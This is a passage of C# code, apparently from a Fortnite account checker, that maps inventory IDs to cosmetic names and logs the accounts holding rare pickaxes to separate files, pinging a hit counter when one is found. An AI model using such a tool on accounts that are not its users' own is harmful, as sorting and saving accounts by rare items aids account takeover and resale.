                                {
                                    FnBattleRoyalLB.Items.Add("=> Bladed Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems136 = x.Contains("143_madcommandermale");
                            if (BackBlingItems136)
                            {
                                sw.WriteLine("=> Spike Chamber");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spike Chamber");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems137 = x.Contains("144_madcommanderfemale");
                            if (BackBlingItems137)
                            {
                                sw.WriteLine("=> Puncture Pack");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Puncture Pack");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems138 = x.Contains("145_animaljacketsmale");
                            if (BackBlingItems138)
                            {
                                sw.WriteLine("=> Woofs");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Woofs");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems139 = x.Contains("146_animaljacketsfemale");
                            if (BackBlingItems139)
                            {
                                sw.WriteLine("=> Nibbles");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nibbles");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems140 = x.Contains("147_lilkev");
                            if (BackBlingItems140)
                            {
                                sw.WriteLine("=> Lil' Kev");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lil' Kev");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems141 = x.Contains("148_robotred");
                            if (BackBlingItems141)
                            {
                                sw.WriteLine("=> E.l.i.m.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> E.l.i.m.");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems142 = x.Contains("149_wizard");
                            if (BackBlingItems142)
                            {
                                sw.WriteLine("=> Spellbinder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spellbinder");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems143 = x.Contains("150_witch");
                            if (BackBlingItems143)
                            {
                                sw.WriteLine("=> Tome Pouch");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tome Pouch");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems144 = x.Contains("151_sushicheffemale");
                            if (BackBlingItems144)
                            {
                                sw.WriteLine("=> Shrimpy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shrimpy");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems145 = x.Contains("152_hornedmaskmale");
                            if (BackBlingItems145)
                            {
                                sw.WriteLine("=> Trusty Tusks");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trusty Tusks");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems146 = x.Contains("153_hornedmaskfemale");
                            if (BackBlingItems146)
                            {
                                sw.WriteLine("=> White Fang");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> White Fang");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems147 = x.Contains("154_feathers");
                            if (BackBlingItems147)
                            {
                                sw.WriteLine("=> Hatchback");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hatchback");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems148 = x.Contains("155_sniperhoodmale");
                            if (BackBlingItems148)
                            {
                                sw.WriteLine("=> Scope Satchel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scope Satchel");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems149 = x.Contains("156_sniperhoodfemale");
                            if (BackBlingItems149)
                            {
                                sw.WriteLine("=> Sight Sling");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sight Sling");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems150 = x.Contains("170_mathfemale");
                            if (BackBlingItems150)
                            {
                                sw.WriteLine("=> Techie");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Techie");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems151 = x.Contains("164_snowmanmale");
                            if (BackBlingItems151)
                            {
                                sw.WriteLine("=> Slushy Jr.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slushy Jr.");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems152 = x.Contains("157_mothmale");
                            if (BackBlingItems152)
                            {
                                sw.WriteLine("=> Wingback");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wingback");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems153 = x.Contains("158_arcticsnipermale");
                            if (BackBlingItems153)
                            {
                                sw.WriteLine("=> Altitude");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Altitude");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems154 = x.Contains("160_tacticalsantamale");
                            if (BackBlingItems154)
                            {
                                sw.WriteLine("=> Perfect Present");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Perfect Present");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems155 = x.Contains("161_snowboardfemale");
                            if (BackBlingItems155)
                            {
                                sw.WriteLine("=> Trail Tote");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trail Tote");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems156 = x.Contains("162_yetimale");
                            if (BackBlingItems156)
                            {
                                sw.WriteLine("=> Ice Cube");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ice Cube");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems157 = x.Contains("163_iceking");
                            if (BackBlingItems157)
                            {
                                sw.WriteLine("=> Ice Mantle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ice Mantle");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems158 = x.Contains("164_snowmanmale");
                            if (BackBlingItems158)
                            {
                                sw.WriteLine("=> Slushy Jr.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slushy Jr.");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems159 = x.Contains("165_bluebadassfemale");
                            if (BackBlingItems159)
                            {
                                sw.WriteLine("=> Signal Hub");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Signal Hub");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems160 = x.Contains("166_ravenwintermale");
                            if (BackBlingItems160)
                            {
                                sw.WriteLine("=> Frozen Iron Cage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Iron Cage");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems161 = x.Contains("167_redknightwinterfemale");
                            if (BackBlingItems161)
                            {
                                sw.WriteLine("=> Frozen Red Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Red Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems162 = x.Contains("168_cupidwintermale");
                            if (BackBlingItems162)
                            {
                                sw.WriteLine("=> Frozen Love Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Love Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems163 = x.Contains("169_mathmale");
                            if (BackBlingItems163)
                            {
                                sw.WriteLine("=> Tabulator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tabulator");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems164 = x.Contains("181_snowninjamale");
                            if (BackBlingItems164)
                            {
                                sw.WriteLine("=> Snowfoot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snowfoot");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems165 = x.Contains("182_nutcrackermale");
                            if (BackBlingItems165)
                            {
                                sw.WriteLine("=> Birdshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Birdshot");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems166 = x.Contains("186_gingerbreadmale");
                            if (BackBlingItems166)
                            {
                                sw.WriteLine("=> Mini Marauder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mini Marauder");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems167 = x.Contains("187_gingerbreadfemale");
                            if (BackBlingItems167)
                            {
                                sw.WriteLine("=> Giddy Gunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Giddy Gunner");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems168 = x.Contains("191_winterghoulmale");
                            if (BackBlingItems168)
                            {
                                sw.WriteLine("=> Shadow Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shadow Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems169 = x.Contains("192_winterholidayfemale");
                            if (BackBlingItems169)
                            {
                                sw.WriteLine("=> Combat Wreath");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Combat Wreath");
                                }
                                backblingfound = backblingfound + 1;
                            }
                        }
                        int AxesFound = 0;
                        if (CheckForAxes.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Pickaxes>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Pickaxes>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool flag106 = x.Contains("AthenaPickaxe:pickaxe_id_013_teslacoil");
                            if (flag106)
                            {
                                sw.WriteLine("=> AC/DC");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> AC/DC");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag107 = x.Contains("AthenaPickaxe:pickaxe_id_053_deco");
                            if (flag107)
                            {
                                sw.WriteLine("=> Airfoil");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Airfoil");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag108 = x.Contains("AthenaPickaxe:pickaxe_id_011_medieval");
                            if (flag108)
                            {
                                sw.WriteLine("=> Axecalibur");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Axecalibur");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag109 = x.Contains("AthenaPickaxe:pickaxe_id_040_pizza");
                            if (flag109)
                            {
                                sw.WriteLine("=> Axeroni");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Axeroni");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag110 = x.Contains("AthenaPickaxe:sicklebatpickaxe");
                            if (flag110)
                            {
                                sw.WriteLine("=> Batsickle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Batsickle");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag111 = x.Contains("AthenaPickaxe:pickaxe_id_041_pajamaparty");
                            if (flag111)
                            {
                                sw.WriteLine("=> Bitemark");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bitemark");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag112 = x.Contains("AthenaPickaxe:pickaxe_id_018_anchor");
                            if (flag112)
                            {
                                sw.WriteLine("=> Bottom Feeder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bottom Feeder");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag113 = x.Contains("AthenaPickaxe:pickaxe_id_015_holidaycandycane");
                            if (flag113)
                            {
                                sw.WriteLine("=> Candy Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Candy Axe");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalGlidersChecked);
                                if (CandyAxeSaveFile.Checked)
                                {
                                    using (StreamWriter CandyAxeS = File.AppendText(Candyaxe))
                                    {
                                        CandyAxeS.WriteLine(account);
                                    }
                                }
                                AxesFound = AxesFound + 1;
                            }
                            bool flag114 = x.Contains("AthenaPickaxe:pickaxe_id_038_carrot");
                            if (flag114)
                            {
                                sw.WriteLine("=> Carrot Stick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Carrot Stick");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag115 = x.Contains("AthenaPickaxe:pickaxe_id_017_shark");
                            if (flag115)
                            {
                                sw.WriteLine("=> Chomp Jr.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chomp Jr.");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag116 = x.Contains("AthenaPickaxe:skiicepickaxe");
                            if (flag116)
                            {
                                sw.WriteLine("=> Cliffhanger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cliffhanger");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag117 = x.Contains("AthenaPickaxe:defaultpickaxe");
                            if (flag117)
                            {
                                sw.WriteLine("=> Default Pickaxe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Default Pickaxe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag118 = x.Contains("AthenaPickaxe:pickaxe_id_054_filmcamera");
                            if (flag118)
                            {
                                sw.WriteLine("=> Director's Cut");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Director's Cut");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag119 = x.Contains("AthenaPickaxe:pickaxe_id_016_disco");
                            if (flag119)
                            {
                                sw.WriteLine("=> Disco Brawl");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Disco Brawl");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag120 = x.Contains("AthenaPickaxe:pickaxe_id_025_dragon");
                            if (flag120)
                            {
                                sw.WriteLine("=> Dragon Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dragon Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag121 = x.Contains("AthenaPickaxe:pickaxe_id_062_soccer");
                            if (flag121)
                            {
                                sw.WriteLine("=> Elite Cleat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Elite Cleat");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag122 = x.Contains("AthenaPickaxe:pickaxe_id_028_space");
                            if (flag122)
                            {
                                sw.WriteLine("=> EVA");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> EVA");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag123 = x.Contains("AthenaPickaxe:pickaxe_id_045_valor");
                            if (flag123)
                            {
                                sw.WriteLine("=> Gale Force");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gale Force");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag124 = x.Contains("AthenaPickaxe:pickaxe_id_051_neonglow");
                            if (flag124)
                            {
                                sw.WriteLine("=> Glow Stick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Glow Stick");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag125 = x.Contains("AthenaPickaxe:pickaxe_id_014_wintercamo");
                            if (flag125)
                            {
                                sw.WriteLine("=> Ice breaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ice breaker");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag126 = x.Contains("AthenaPickaxe:pickaxe_id_039_tacticalblack");
                            if (flag126)
                            {
                                sw.WriteLine("=> Instigator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Instigator");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag127 = x.Contains("AthenaPickaxe:pickaxe_id_046_candy");
                            if (flag127)
                            {
                                sw.WriteLine("=> Lollipopper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lollipopper");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag128 = x.Contains("AthenaPickaxe:pickaxe_id_064_gumshoe");
                            if (flag128)
                            {
                                sw.WriteLine("=> Magnifying Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Magnifying Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag129 = x.Contains("AthenaPickaxe:pickaxe_id_048_carbideblack");
                            if (flag129)
                            {
                                sw.WriteLine("=> Onslaught");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Onslaught");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag130 = x.Contains("AthenaPickaxe:pickaxe_id_059_darkeagle");
                            if (flag130)
                            {
                                sw.WriteLine("=> Oracle Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Oracle Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag131 = x.Contains("AthenaPickaxe:pickaxe_id_029_assassin");
                            if (flag131)
                            {
                                sw.WriteLine("=> Party Animal");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Party Animal");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag132 = x.Contains("AthenaPickaxe:pickaxe_id_031_squeak");
                            if (flag132)
                            {
                                sw.WriteLine("=> Pick Squeak");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pick Squeak");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag133 = x.Contains("AthenaPickaxe:pickaxe_flamingo");
                            if (flag133)
                            {
                                sw.WriteLine("=> Pink Flamingo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pink Flamingo");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag134 = x.Contains("AthenaPickaxe:pickaxe_id_024_plunger");
                            if (flag134)
                            {
                                sw.WriteLine("=> Plunja");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Plunja");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag135 = x.Contains("AthenaPickaxe:pickaxe_id_047_carbideblue");
                            if (flag135)
                            {
                                sw.WriteLine("=> Positron");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Positron");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag136 = x.Contains("AthenaPickaxe:pickaxe_id_061_wwiipilot");
                            if (flag136)
                            {
                                sw.WriteLine("=> Propeller Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Propeller Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag137 = x.Contains("AthenaPickaxe:pickaxe_id_012_district");
                            if (flag137)
                            {
                                sw.WriteLine("=> Pulse Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pulse Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag138 = x.Contains("AthenaPickaxe:pickaxe_lockjaw");
                            if (flag138)
                            {
                                sw.WriteLine("=> Raider's Revenge");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raider's Revenge");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalGlidersChecked);
                                if (RaidersRevengeSaveFile.Checked)
                                {
                                    using (StreamWriter RaidersrevengeS = File.AppendText(Raidersrevenge))
                                    {
                                        RaidersrevengeS.WriteLine(account);
                                    }
                                }
                                AxesFound = AxesFound + 1;
                            }
                            bool flag139 = x.Contains("AthenaPickaxe:pickaxe_id_026_brite");
                            if (flag139)
                            {
                                sw.WriteLine("=> Rainbow Smash");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rainbow Smash");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag140 = x.Contains("AthenaPickaxe:halloweenscythe");
                            if (flag140)
                            {
                                sw.WriteLine("=> Scythe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scythe");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                                if (ScytheSaveFile.Checked)
                                {
                                    using (StreamWriter scythaxehehe = File.AppendText(Scythe))
                                    {
                                        scythaxehehe.WriteLine(account);
                                    }
                                }
                            }
                            bool flag141 = x.Contains("AthenaPickaxe:pickaxe_id_050_graffiti");
                            if (flag141)
                            {
                                sw.WriteLine("=> Renegade Roller");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Renegade Roller");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag142 = x.Contains("AthenaPickaxe:pickaxe_id_027_scavenger");
                            if (flag142)
                            {
                                sw.WriteLine("=> Sawtooth");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sawtooth");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag143 = x.Contains("AthenaPickaxe:pickaxe_id_023_skiboot");
                            if (flag143)
                            {
                                sw.WriteLine("=> Ski Boot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ski Boot");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag144 = x.Contains("AthenaPickaxe:pickaxe_id_035_prismatic");
                            if (flag144)
                            {
                                sw.WriteLine("=> Spectral Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spectral Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag145 = x.Contains("AthenaPickaxe:pickaxe_id_037_stealth");
                            if (flag145)
                            {
                                sw.WriteLine("=> Spectre");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spectre");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag146 = x.Contains("AthenaPickaxe:pickaxe_id_044_tacticalurbanhammer");
                            if (flag146)
                            {
                                sw.WriteLine("=> Tenderizer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tenderizer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag147 = x.Contains("AthenaPickaxe:pickaxe_id_029_assassin");
                            if (flag147)
                            {
                                sw.WriteLine("=> Trusty No. 2");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trusty No. 2");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag148 = x.Contains("AthenaPickaxe:pickaxe_id_063_vuvuzela");
                            if (flag148)
                            {
                                sw.WriteLine("=> Vuvuzela");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Vuvuzela");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag169 = x.Contains("AthenaPickaxe:pickaxe_id_068_drift");
                            if (flag169)
                            {
                                sw.WriteLine("=> Rift Edge");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rift Edge");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag170 = x.Contains("AthenaPickaxe:pickaxe_id_073_balloon");
                            if (flag170)
                            {
                                sw.WriteLine("=> Balloon Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Balloon Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool flag171 = x.Contains("AthenaPickaxe:pickaxe_id_071_streetracer");
                            if (flag171)
                            {
                                sw.WriteLine("=> Lug Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lug Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound1 = x.Contains("AthenaPickaxe:boltonpickaxe");
                            if (NewAxesFound1)
                            {
                                sw.WriteLine("=> Close Shave");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Close Shave");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound2 = x.Contains("AthenaPickaxe:happypickaxe");
                            if (NewAxesFound2)
                            {
                                sw.WriteLine("=> Lucky");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lucky");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
